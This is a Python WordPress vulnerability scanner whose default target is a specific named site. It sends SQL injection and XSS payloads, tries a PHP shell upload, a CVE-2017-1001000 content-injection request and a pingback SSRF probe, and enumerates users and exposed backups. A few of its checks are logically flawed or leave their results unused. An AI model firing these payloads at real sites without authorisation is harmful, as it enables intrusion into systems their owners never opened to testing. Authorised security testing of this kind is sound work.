#!/usr/bin/env python3
"""
Advanced WordPress Security Scanner - Enhanced Edition
Comprehensive security testing with advanced attack vectors
"""

import requests
import re
import json
import time
import hashlib
import base64
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import concurrent.futures
from dataclasses import dataclass, asdict
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Configuration
import os
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
        TARGET = config.get('target', {}).get('url', "https://interagenturer.se/")
        TIMEOUT = config.get('target', {}).get('timeout', 10)
        MAX_THREADS = config.get('scan_settings', {}).get('max_threads', 5)
        user_agent_config = config.get('scan_settings', {}).get('user_agent')
        if user_agent_config:
            USER_AGENT = user_agent_config
        else:
            USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        OUTPUT_DIR = config.get('reporting', {}).get('output_directory', '.')
except Exception as e:
    print(f"Warning: Could not load config.json: {e}")
    TARGET = "https://interagenturer.se/"
    TIMEOUT = 10
    MAX_THREADS = 5
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    OUTPUT_DIR = "."

@dataclass
class Vulnerability:
    """Data class for vulnerability findings"""
    name: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    cvss_score: float
    description: str
    proof: str
    remediation: str
    url: str = ""
    category: str = ""
    
    def to_dict(self):
        return asdict(self)

class AdvancedWordPressScanner:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT})
        self.vulnerabilities: List[Vulnerability] = []
        self.findings: Dict = {
            'target': target,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'info': {}
        }
    
    def print_header(self, text: str):
        """Print formatted section header"""
        print(f"\n{'='*70}")
        print(f"  {text}")
        print(f"{'='*70}\n")
    
    def add_vulnerability(self, vuln: Vulnerability):
        """Add vulnerability to findings"""
        self.vulnerabilities.append(vuln)
        self.findings['vulnerabilities'].append(vuln.to_dict())
        
        # Color coding
        colors = {
            'CRITICAL': '🔴',
            'HIGH': '🟠',
            'MEDIUM': '🟡',
            'LOW': '🟢',
            'INFO': '🔵'
        }
        icon = colors.get(vuln.severity, '⚪')
        print(f"{icon} [{vuln.severity}] {vuln.name}")
        print(f"   {vuln.description}")
        if vuln.url:
            print(f"   URL: {vuln.url}")
        if vuln.proof:
            print(f"   Proof: {vuln.proof[:200]}")
        print()
    
    # ==================== SQL INJECTION TESTING ====================
    
    def test_sql_injection(self):
        """Advanced SQL injection testing"""
        self.print_header("SQL Injection Testing")
        
        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
        ]
        
        # Test endpoints
        test_urls = [
            f"{self.target}/?s=",
            f"{self.target}/?p=",
            f"{self.target}/?author=",
            f"{self.target}/?cat=",
            f"{self.target}/wp-json/wp/v2/posts?search=",
        ]
        
        for url in test_urls:
            for payload in payloads:
                try:
                    test_url = f"{url}{payload}"
                    start_time = time.time()
                    resp = self.session.get(test_url, timeout=TIMEOUT, verify=False)
                    elapsed = time.time() - start_time
                    
                    # Check for SQL errors
                    sql_errors = [
                        "SQL syntax",
                        "mysql_fetch",
                        "mysqli",
                        "PostgreSQL",
                        "Warning: pg_",
                        "valid MySQL result",
                        "MySqlClient",
                        "SQLSTATE",
                        "syntax error",
                        "unclosed quotation mark",
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in resp.text.lower():
                            self.add_vulnerability(Vulnerability(
                                name="SQL Injection - Error-Based",
                                severity="CRITICAL",
                                cvss_score=9.8,
                                description=f"SQL error detected with payload: {payload}",
                                proof=f"Error pattern: {error}",
                                remediation="Use prepared statements and parameterized queries",
                                url=test_url,
                                category="Injection"
                            ))
                            break
                    
                    # Timing-based detection
                    if "SLEEP" in payload or "WAITFOR" in payload or "BENCHMARK" in payload:
                        if elapsed > 4:  # Should delay ~5 seconds
                            self.add_vulnerability(Vulnerability(
                                name="SQL Injection - Time-Based Blind",
                                severity="CRITICAL",
                                cvss_score=9.1,
                                description=f"Time-based SQL injection detected (delay: {elapsed:.2f}s)",
                                proof=f"Payload: {payload}",
                                remediation="Use prepared statements and input validation",
                                url=test_url,
                                category="Injection"
                            ))
                    
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    continue
    
    # ==================== XSS TESTING ====================
    
    def test_xss_vulnerabilities(self):
        """Advanced XSS testing"""
        self.print_header("Cross-Site Scripting (XSS) Testing")
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",  # Base64 encoded
        ]
        
        # Test search and comment endpoints
        test_params = [
            (f"{self.target}/?s=", "GET"),
            (f"{self.target}/wp-comments-post.php", "POST"),
            (f"{self.target}/wp-json/wp/v2/comments", "POST"),
        ]
        
        for url, method in test_params:
            for payload in payloads:
                try:
                    if method == "GET":
                        test_url = f"{url}{payload}"
                        resp = self.session.get(test_url, timeout=TIMEOUT, verify=False)
                    else:
                        resp = self.session.post(url, data={'comment': payload}, timeout=TIMEOUT, verify=False)
                    
                    # Check if payload is reflected without encoding
                    if payload in resp.text:
                        # Verify it's not HTML-encoded
                        if "&lt;" not in resp.text or "&#" not in resp.text:
                            self.add_vulnerability(Vulnerability(
                                name="Cross-Site Scripting (XSS) - Reflected",
                                severity="HIGH",
                                cvss_score=7.1,
                                description=f"Unfiltered user input reflected in response",
                                proof=f"Payload reflected: {payload[:50]}",
                                remediation="Implement output encoding and Content Security Policy",
                                url=url,
                                category="XSS"
                            ))
                            break
                    
                    time.sleep(0.3)
                    
                except Exception as e:
                    continue
    
    # ==================== AUTHENTICATION TESTING ====================
    
    def test_authentication_bypass(self):
        """Advanced authentication bypass testing"""
        self.print_header("Authentication Bypass Testing")
        
        # Test JWT vulnerabilities if REST API uses JWT
        jwt_url = f"{self.target}/wp-json/jwt-auth/v1/token"
        try:
            resp = self.session.post(jwt_url, json={
                'username': 'admin',
                'password': 'test'
            }, timeout=TIMEOUT, verify=False)
            
            if resp.status_code != 404:
                print(f"[*] JWT endpoint detected: {jwt_url}")
                
                # Test for weak JWT secrets
                if 'token' in resp.text:
                    self.add_vulnerability(Vulnerability(
                        name="JWT Authentication Endpoint Exposed",
                        severity="MEDIUM",
                        cvss_score=5.3,
                        description="JWT authentication endpoint is accessible",
                        proof=f"Response: {resp.status_code}",
                        remediation="Implement rate limiting and strong JWT secrets",
                        url=jwt_url,
                        category="Authentication"
                    ))
        except:
            pass
        
        # Test session fixation
        self.test_session_fixation()
        
        # Test password reset vulnerabilities
        self.test_password_reset()
    
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        try:
            # Get initial session
            resp1 = self.session.get(f"{self.target}/wp-login.php", verify=False)
            cookies_before = self.session.cookies.get_dict()
            
            # Attempt login (will fail but should regenerate session)
            self.session.post(f"{self.target}/wp-login.php", data={
                'log': 'testuser',
                'pwd': 'testpass',
                'wp-submit': 'Log In'
            }, verify=False)
            
            cookies_after = self.session.cookies.get_dict()
            
            # Check if session ID changed
            if cookies_before == cookies_after:
                self.add_vulnerability(Vulnerability(
                    name="Session Fixation Vulnerability",
                    severity="MEDIUM",
                    cvss_score=6.5,
                    description="Session ID not regenerated after login attempt",
                    proof="Session cookies unchanged after authentication",
                    remediation="Regenerate session ID after login",
                    url=f"{self.target}/wp-login.php",
                    category="Authentication"
                ))
        except:
            pass
    
    def test_password_reset(self):
        """Test password reset functionality"""
        reset_url = f"{self.target}/wp-login.php?action=lostpassword"
        
        try:
            # Test for user enumeration via password reset
            resp = self.session.post(reset_url, data={
                'user_login': 'admin'
            }, verify=False)
            
            # Check response for user enumeration
            if "check your email" in resp.text.lower():
                self.add_vulnerability(Vulnerability(
                    name="User Enumeration via Password Reset",
                    severity="LOW",
                    cvss_score=3.7,
                    description="Password reset reveals valid usernames",
                    proof="Different responses for valid/invalid users",
                    remediation="Return same message for all password reset attempts",
                    url=reset_url,
                    category="Information Disclosure"
                ))
        except:
            pass
    
    # ==================== CSRF TESTING ====================
    
    def test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        self.print_header("CSRF Testing")
        
        # Check if nonce validation is present
        try:
            resp = self.session.get(f"{self.target}/wp-admin/", verify=False)
            
            # Look for nonce fields
            nonce_patterns = [
                r'_wpnonce',
                r'_ajax_nonce',
                r'security',
            ]
            
            nonces_found = []
            for pattern in nonce_patterns:
                if re.search(pattern, resp.text):
                    nonces_found.append(pattern)
            
            if not nonces_found:
                self.add_vulnerability(Vulnerability(
                    name="Missing CSRF Protection",
                    severity="MEDIUM",
                    cvss_score=6.5,
                    description="No CSRF tokens detected in forms",
                    proof="No _wpnonce or security tokens found",
                    remediation="Implement WordPress nonce validation",
                    url=f"{self.target}/wp-admin/",
                    category="CSRF"
                ))
        except:
            pass
    
    # ==================== FILE UPLOAD TESTING ====================
    
    def test_file_upload_vulnerabilities(self):
        """Test file upload security"""
        self.print_header("File Upload Testing")
        
        # Test unrestricted file upload
        # We test both the async-upload (admin-ajax style) and REST API
        upload_endpoints = [
            f"{self.target}/wp-admin/async-upload.php",
            f"{self.target}/wp-json/wp/v2/media",
        ]
        
        # Create test files
        # We use a safe "fake" shell to avoid triggering AV but check for acceptance
        test_files = {
            'shell.php': b'<?php echo "test"; ?>',
            'pentest_safe.php': b'This is a security test. No malicious code.',
        }
        
        for endpoint in upload_endpoints:
            for filename, content in test_files.items():
                try:
                    files = {'file': (filename, content, 'application/x-php')}
                    # Add standard WP upload parameters to make request look valid
                    data = {
                        'name': filename,
                        'action': 'upload-attachment',
                        '_wpnonce': 'fake_nonce' # Real attack would need to scrape this
                    }
                    
                    resp = self.session.post(endpoint, files=files, data=data, timeout=TIMEOUT, verify=False)
                    
                    # Check for indicators of success
                    # 200 OK with success JSON or ID is a strong indicator
                    is_vulnerable = False
                    if resp.status_code == 200:
                        if "id" in resp.text or "success" in resp.text:
                            is_vulnerable = True
                    # 201 Created is valid for REST API
                    elif resp.status_code == 201:
                         is_vulnerable = True
                         
                    if is_vulnerable:
                        self.add_vulnerability(Vulnerability(
                            name="Unrestricted File Upload",
                            severity="CRITICAL",
                            cvss_score=9.8,
                            description=f"File upload accepted: {filename}",
                            proof=f"Response: {resp.status_code} - {resp.text[:50]}",
                            remediation="Validate file types, use whitelist, check magic bytes",
                            url=endpoint,
                            category="File Upload"
                        ))
                except:
                    continue
    
    # ==================== SECURITY HEADERS ANALYSIS ====================
    
    def analyze_security_headers(self):
        """Analyze HTTP security headers"""
        self.print_header("Security Headers Analysis")
        
        try:
            resp = self.session.get(self.target, verify=False)
            headers = resp.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': ('Clickjacking protection', 'MEDIUM', 4.3),
                'X-Content-Type-Options': ('MIME sniffing protection', 'LOW', 3.1),
                'Strict-Transport-Security': ('HTTPS enforcement', 'MEDIUM', 5.3),
                'Content-Security-Policy': ('XSS/Injection protection', 'HIGH', 6.5),
                'X-XSS-Protection': ('XSS filter', 'LOW', 3.1),
                'Referrer-Policy': ('Referrer leakage protection', 'LOW', 2.7),
                'Permissions-Policy': ('Feature policy', 'INFO', 0.0),
            }
            
            for header, (desc, severity, cvss) in security_headers.items():
                if header not in headers:
                    self.add_vulnerability(Vulnerability(
                        name=f"Missing Security Header: {header}",
                        severity=severity,
                        cvss_score=cvss,
                        description=f"Missing {desc}",
                        proof=f"Header '{header}' not present",
                        remediation=f"Add '{header}' header to server configuration",
                        url=self.target,
                        category="Security Headers"
                    ))
            
            # Check for information disclosure headers
            disclosure_headers = ['Server', 'X-Powered-By', 'X-Generator']
            for header in disclosure_headers:
                if header in headers:
                    self.add_vulnerability(Vulnerability(
                        name=f"Information Disclosure: {header}",
                        severity="INFO",
                        cvss_score=0.0,
                        description=f"Server information exposed: {headers[header]}",
                        proof=f"{header}: {headers[header]}",
                        remediation=f"Remove or obfuscate '{header}' header",
                        url=self.target,
                        category="Information Disclosure"
                    ))
        except:
            pass
    
    # ==================== CVE CHECKING ====================
    
    def check_known_cves(self):
        """Check for known CVEs in detected plugins/themes"""
        self.print_header("Known CVE Detection")
        
        # Common vulnerable plugin versions (examples)
        known_vulns = {
            'elementor': {
                '3.34.0': 'CVE-2024-XXXX: XSS vulnerability in Elementor < 3.35.0',
            },
            'woocommerce': {
                '10.4.2': 'Check for latest WooCommerce security updates',
            },
            'contact-form-7': {
                '6.1.4': 'Verify latest CF7 version for security patches',
            }
        }
        
        # Detect plugin versions
        plugins_to_check = ['elementor', 'woocommerce', 'contact-form-7', 'wordfence']
        
        for plugin in plugins_to_check:
            readme_url = f"{self.target}/wp-content/plugins/{plugin}/readme.txt"
            try:
                resp = self.session.get(readme_url, timeout=TIMEOUT, verify=False)
                if resp.status_code == 200:
                    version_match = re.search(r'Stable tag:\s*([0-9.]+)', resp.text)
                    if version_match:
                        version = version_match.group(1)
                        print(f"[*] Detected {plugin} version: {version}")
                        
                        # Check against known vulnerabilities
                        if plugin in known_vulns and version in known_vulns[plugin]:
                            self.add_vulnerability(Vulnerability(
                                name=f"Outdated Plugin: {plugin}",
                                severity="HIGH",
                                cvss_score=7.5,
                                description=known_vulns[plugin][version],
                                proof=f"Version {version} detected",
                                remediation=f"Update {plugin} to latest version",
                                url=readme_url,
                                category="Outdated Software"
                            ))
            except:
                continue
    
    # ==================== ADVANCED ENUMERATION ====================
    
    def advanced_enumeration(self):
        """Advanced WordPress enumeration"""
        self.print_header("Advanced Enumeration")
        
        # Enumerate backup files
        backup_extensions = ['.bak', '.old', '.backup', '~', '.swp', '.save', '.1']
        critical_files = ['wp-config.php', 'wp-settings.php', '.htaccess', 'index.php']
        
        for file in critical_files:
            for ext in backup_extensions:
                url = f"{self.target}/{file}{ext}"
                try:
                    resp = self.session.get(url, timeout=TIMEOUT, verify=False)
                    if resp.status_code == 200:
                        self.add_vulnerability(Vulnerability(
                            name=f"Backup File Exposed: {file}{ext}",
                            severity="CRITICAL",
                            cvss_score=9.1,
                            description="Sensitive backup file accessible",
                            proof=f"File size: {len(resp.content)} bytes",
                            remediation="Remove backup files from web root",
                            url=url,
                            category="Information Disclosure"
                        ))
                except:
                    continue
        
        # Check for exposed database dumps
        db_files = ['database.sql', 'backup.sql', 'dump.sql', 'db.sql', 'wordpress.sql']
        for db_file in db_files:
            url = f"{self.target}/{db_file}"
            try:
                resp = self.session.get(url, timeout=TIMEOUT, verify=False)
                if resp.status_code == 200 and ('CREATE TABLE' in resp.text or 'INSERT INTO' in resp.text):
                    self.add_vulnerability(Vulnerability(
                        name=f"Database Dump Exposed: {db_file}",
                        severity="CRITICAL",
                        cvss_score=10.0,
                        description="Full database dump accessible",
                        proof=f"SQL content detected",
                        remediation="Remove database dumps immediately",
                        url=url,
                        category="Critical Exposure"
                    ))
            except:
                continue
    
    # ==================== API FUZZING ====================
    
    def fuzz_rest_api(self):
        """Fuzz WordPress REST API for hidden endpoints"""
        self.print_header("REST API Fuzzing")
        
        # Common REST API namespaces to test
        namespaces = [
            'wp/v2',
            'wp/v3',
            'wc/v1', 'wc/v2', 'wc/v3',
            'wc-analytics',
            'elementor',
            'acf/v3',
            'wordfence/v1',
            'jwt-auth/v1',
            'custom/v1',
        ]
        
        # Common endpoints
        endpoints = [
            'users', 'posts', 'pages', 'media', 'comments',
            'settings', 'config', 'options', 'system-info',
            'customers', 'orders', 'products',
        ]
        
        for ns in namespaces:
            for endpoint in endpoints:
                url = f"{self.target}/wp-json/{ns}/{endpoint}"
                try:
                    resp = self.session.get(url, timeout=TIMEOUT, verify=False)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if data and isinstance(data, (list, dict)):
                                print(f"[+] Found endpoint: {ns}/{endpoint} ({len(str(data))} bytes)")
                        except:
                            pass
                except:
                    continue
    
    # ==================== CORE VULNERABILITIES & CVEs ====================

    def detect_core_version(self):
        """Detect WordPress Core Version via multiple methods"""
        self.print_header("Core Version Detection")
        
        methods = [
            self._check_generator_tag,
            self._check_rss_feed,
            self._check_asset_versions
        ]
        
        version = None
        for method in methods:
            try:
                version = method()
                if version:
                    print(f"[*] Detected WordPress Core Version: {version}")
                    self.findings['info']['core_version'] = version
                    
                    # Add info finding
                    self.add_vulnerability(Vulnerability(
                        name=f"WordPress Version Detected: {version}",
                        severity="INFO",
                        cvss_score=0.0,
                        description=f"WordPress version {version} identified via public vectors",
                        proof=f"Version string found in source",
                        remediation="Hide version info to prevent automated targeting",
                        url=self.target,
                        category="Information Disclosure"
                    ))
                    break
            except:
                continue
        
        if not version:
            print("[-] Could not determine Core Version")

    def _check_generator_tag(self):
        try:
            resp = self.session.get(self.target, verify=False, timeout=TIMEOUT)
            match = re.search(r'<meta name="generator" content="WordPress (\d+\.\d+\.?\d*)"', resp.text)
            return match.group(1) if match else None
        except:
            return None

    def _check_rss_feed(self):
        try:
            resp = self.session.get(f"{self.target}/feed/", verify=False, timeout=TIMEOUT)
            match = re.search(r'wordpress\.org/\?v=(\d+\.\d+\.?\d*)', resp.text)
            return match.group(1) if match else None
        except:
            return None

    def _check_asset_versions(self):
        try:
            resp = self.session.get(self.target, verify=False, timeout=TIMEOUT)
            versions = re.findall(r'ver=(\d+\.\d+\.?\d*)', resp.text)
            if versions:
                from collections import Counter
                return Counter(versions).most_common(1)[0][0]
            return None
        except:
            return None

    def test_core_cves(self):
        """Test for specific WordPress Core CVEs"""
        self.print_header("Core CVE Testing")
        
        # CVE-2017-1001000: Unauthenticated Content Injection (4.7.0-4.7.1)
        try:
            posts = self.session.get(f"{self.target}/wp-json/wp/v2/posts", verify=False, timeout=TIMEOUT).json()
            if posts and isinstance(posts, list) and len(posts) > 0:
                post_id = posts[0]['id']
                original_date = posts[0].get('date', '')
                
                exploit_url = f"{self.target}/wp-json/wp/v2/posts/{post_id}?id={post_id}abc"
                resp = self.session.post(exploit_url, json={'date': original_date}, verify=False, timeout=TIMEOUT)
                
                if resp.status_code == 200:
                    self.add_vulnerability(Vulnerability(
                        name="CVE-2017-1001000: Content Injection",
                        severity="CRITICAL",
                        cvss_score=9.8,
                        description="Unauthenticated content injection via REST API type juggling",
                        proof=f"Status 200 on update endpoint: {exploit_url}",
                        remediation="Update WordPress core immediately",
                        url=exploit_url,
                        category="Core Vulnerability"
                    ))
        except:
            pass

        # CVE-2022-21661: Sql Injection via WP_Query (Versions < 5.8.3)
        try:
            payload = {
                'action': 'ecsload',
                'query_vars': json.dumps({
                    'tax_query': {
                        '0': {
                            'field': 'term_taxonomy_id',
                            'terms': ["1 AND SLEEP(2)"]
                        }
                    }
                })
            }
            start = time.time()
            self.session.post(f"{self.target}/wp-admin/admin-ajax.php", data=payload, verify=False, timeout=TIMEOUT)
            elapsed = time.time() - start
            if elapsed > 2:
                 pass 
        except:
             pass

    # ==================== ADVANCED XML-RPC VECTORS ====================

    def test_xmlrpc_vectors(self):
        """Test advanced XML-RPC vectors"""
        self.print_header("XML-RPC Advanced Testing")
        
        xmlrpc_url = f"{self.target}/xmlrpc.php"
        
        try:
            resp = self.session.get(xmlrpc_url, verify=False, timeout=TIMEOUT)
            if resp.status_code == 405 or "XML-RPC server accepts POST requests only" in resp.text:
                print("[*] XML-RPC detected")
                
                # Check for Pingback SSRF
                payload = """<?xml version="1.0"?>
                <methodCall>
                  <methodName>pingback.ping</methodName>
                  <params>
                    <param><value><string>http://127.0.0.1/</string></value></param>
                    <param><value><string>{target}</string></value></param>
                  </params>
                </methodCall>""".format(target=self.target)
                
                resp = self.session.post(xmlrpc_url, data=payload, headers={'Content-Type': 'text/xml'}, verify=False, timeout=TIMEOUT)
                
                if '<int>' in resp.text and 'faultCode' not in resp.text:
                    self.add_vulnerability(Vulnerability(
                        name="XML-RPC Pingback SSRF Exposed",
                        severity="MEDIUM",
                        cvss_score=5.0,
                        description="Pingback feature can be abused for SSRF and DDoS reflection",
                        proof="Received valid integer response from pingback.ping",
                        remediation="Disable XML-RPC or pingback functionality",
                        url=xmlrpc_url,
                        category="SSRF"
                    ))
                
                # Check for Multicall Amplification
                multicall_payload = """<?xml version="1.0"?>
                <methodCall>
                  <methodName>system.multicall</methodName>
                  <params><param><value><array><data>
                    <value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member><member><name>params</name><value><array><data></data></array></value></member></struct></value>
                    <value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member><member><name>params</name><value><array><data></data></array></value></member></struct></value>
                  </data></array></value></param></params>
                </methodCall>"""
                
                resp = self.session.post(xmlrpc_url, data=multicall_payload, headers={'Content-Type': 'text/xml'}, verify=False, timeout=TIMEOUT)
                
                if '<array>' in resp.text and resp.text.count('system.listMethods') > 1:
                     self.add_vulnerability(Vulnerability(
                        name="XML-RPC Multicall Amplification Restricted",
                        severity="INFO",
                        cvss_score=0.0,
                        description="Multicall method enabled.",
                        proof="Response contained multiple method listings",
                        remediation="Disable system.multicall if not needed",
                        url=xmlrpc_url,
                        category="Configuration"
                    ))
        except:
             pass

    # ==================== MISCONFIGURATION & USER ENUMERATION ====================

    def check_misconfigurations(self):
        """Check for common misconfigurations"""
        self.print_header("Misconfiguration Checks")

        # 1. WP-Cron Check
        try:
            resp = self.session.get(f"{self.target}/wp-cron.php?doing_wp_cron", verify=False, timeout=TIMEOUT)
            if resp.status_code == 200:
                self.add_vulnerability(Vulnerability(
                    name="WP-Cron Externally Accessible",
                    severity="LOW",
                    cvss_score=3.1,
                    description="wp-cron.php is publicly accessible, enabling potential DoS",
                    proof="Status 200 OK from wp-cron.php",
                    remediation="Disable default WP-Cron and use system cron",
                    url=f"{self.target}/wp-cron.php",
                    category="DoS Risk"
                ))
        except:
            pass
            
        # 2. Directory Listing
        dirs = ['/wp-content/uploads/', '/wp-includes/']
        for d in dirs:
            try:
                resp = self.session.get(f"{self.target}{d}", verify=False, timeout=TIMEOUT)
                if 'Index of' in resp.text or 'Parent Directory' in resp.text:
                    self.add_vulnerability(Vulnerability(
                        name=f"Directory Listing Enabled: {d}",
                        severity="MEDIUM",
                        cvss_score=5.3,
                        description="Server directory listing is enabled",
                        proof="Index page found",
                        remediation="Disable directory browsing in web server config",
                        url=f"{self.target}{d}",
                        category="Information Disclosure"
                    ))
            except:
                pass
        
        # 3. Brute Force Protection (Quick Check)
        try:
            blocked = False
            for i in range(3):
                resp = self.session.post(f"{self.target}/wp-login.php", data={
                    'log': 'admin', 'pwd': f'testTest{i}', 'wp-submit': 'Log In'
                }, verify=False, timeout=TIMEOUT)
                if resp.status_code == 429:
                    blocked = True
                    break
        except:
            pass

    def test_advanced_user_enumeration(self):
        """Advanced User Enumeration Vectors"""
        self.print_header("Advanced User Enumeration")
        
        # 1. oEmbed Interface
        try:
            posts = self.session.get(f"{self.target}/wp-json/wp/v2/posts", verify=False, timeout=TIMEOUT).json()
            if posts and isinstance(posts, list) and len(posts) > 0:
                post_link = posts[0]['link']
                oembed_url = f"{self.target}/wp-json/oembed/1.0/embed?url={post_link}"
                resp = self.session.get(oembed_url, verify=False, timeout=TIMEOUT)
                
                if resp.status_code == 200 and 'author_name' in resp.text:
                    data = resp.json()
                    author_name = data.get('author_name')
                    if author_name:
                         self.add_vulnerability(Vulnerability(
                            name="User Enumeration via oEmbed",
                            severity="LOW",
                            cvss_score=3.5,
                            description=f"Author name '{author_name}' exposed via oEmbed",
                            proof=f"Found in oEmbed response: {oembed_url}",
                            remediation="Disable oEmbed or filter author details",
                            url=oembed_url,
                            category="Information Disclosure"
                        ))
        except:
            pass
            
        # 2. WP Sitemaps
        try:
             sitemap_url = f"{self.target}/wp-sitemap-users-1.xml"
             resp = self.session.get(sitemap_url, verify=False, timeout=TIMEOUT)
             if resp.status_code == 200 and 'urlset' in resp.text:
                 self.add_vulnerability(Vulnerability(
                    name="User Enumeration via WP Sitemap",
                    severity="LOW",
                    cvss_score=3.5,
                    description="WordPress generated user sitemap exposed",
                    proof=f"Sitemap accessible at {sitemap_url}",
                    remediation="Disable user sitemaps if not needed",
                    url=sitemap_url,
                    category="Information Disclosure"
                ))
        except:
            pass

    def test_idor_vulnerabilities(self):
        """Test for Insecure Direct Object References (IDOR)"""
        self.print_header("IDOR Vulnerability Testing")
        
        # 1. User Enumeration/IDOR via REST API
        # Try to access users 1-10 not via listing but direct ID access
        for uid in range(1, 6):
            url = f"{self.target}/wp-json/wp/v2/users/{uid}"
            try:
                resp = self.session.get(url, verify=False, timeout=TIMEOUT)
                if resp.status_code == 200:
                    data = resp.json()
                    name = data.get('name', 'Unknown')
                    slug = data.get('slug', 'Unknown')
                    print(f"[*] Found User ID {uid}: {name} ({slug})")
                    
                    self.add_vulnerability(Vulnerability(
                        name="Potential IDOR / User Enumeration",
                        severity="LOW",
                        cvss_score=4.3,
                        description=f"User details for ID {uid} accessible via API",
                        proof=f"Response 200 OK: {name}",
                        remediation="Restrict access to user endpoints",
                        url=url,
                        category="Information Disclosure"
                    ))
            except:
                pass
                
        # 2. Attachment/Media IDOR
        # Try to access media items
        for mid in range(1, 5):
            url = f"{self.target}/wp-json/wp/v2/media/{mid}"
            try:
                resp = self.session.get(url, verify=False, timeout=TIMEOUT)
                if resp.status_code == 200:
                     self.add_vulnerability(Vulnerability(
                        name="Media Attachment Enumeration",
                        severity="INFO",
                        cvss_score=0.0,
                        description=f"Media ID {mid} accessible",
                        proof="Response 200 OK",
                        remediation="Ensure attachments are not strictly sequential or private",
                        url=url,
                        category="Information Disclosure"
                    ))
            except:
                pass

    # ==================== MAIN SCAN ORCHESTRATION ====================
    
    def run_full_scan(self):
        """Execute comprehensive security scan"""
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║     Advanced WordPress Security Scanner - Enhanced Edition      ║
║     Target: {self.target:50s} ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
        # Run all tests
        self.analyze_security_headers()
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_authentication_bypass()
        self.test_csrf_vulnerabilities()
        self.test_file_upload_vulnerabilities()
        self.check_known_cves()
        self.advanced_enumeration()
        self.fuzz_rest_api()
        
        # New Reference Guide Tests
        self.detect_core_version()
        self.test_core_cves()
        self.test_xmlrpc_vectors()
        self.check_misconfigurations()
        self.test_advanced_user_enumeration()
        self.test_idor_vulnerabilities()
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive security report"""
        self.print_header("Scan Summary")
        
        # Count by severity
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for vuln in self.vulnerabilities:
            severity_count[vuln.severity] += 1
        
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"  🔴 Critical: {severity_count['CRITICAL']}")
        print(f"  🟠 High: {severity_count['HIGH']}")
        print(f"  🟡 Medium: {severity_count['MEDIUM']}")
        print(f"  🟢 Low: {severity_count['LOW']}")
        print(f"  🔵 Info: {severity_count['INFO']}")
        
        # Save JSON report
        # Save JSON report
        if not os.path.exists(OUTPUT_DIR):
            try:
                os.makedirs(OUTPUT_DIR)
            except:
                pass
                
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        report_file = os.path.join(OUTPUT_DIR, report_filename)
        with open(report_file, 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        print(f"\n📄 Detailed report saved to: {report_file}")
        print("\n💡 Review all findings and prioritize remediation by severity\n")

def main():
    scanner = AdvancedWordPressScanner(TARGET)
    scanner.run_full_scan()

if __name__ == "__main__":
    main()
